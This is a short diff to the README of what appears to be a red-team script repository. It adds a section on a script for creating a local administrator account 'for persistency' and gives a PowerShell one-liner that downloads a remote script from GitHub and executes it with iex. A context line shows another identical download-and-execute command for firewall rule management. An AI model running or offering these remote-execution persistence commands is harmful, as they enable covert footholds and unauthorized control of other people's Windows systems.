@@ -72,3 +72,9 @@ Windows Firewall Rule Management
 ``` powershell
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/madraseye.ps1') 
 ```
+
+## madraseye.ps1
+Local admin user creation for persistency
+``` powershell
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/perkande.ps1') 
+```
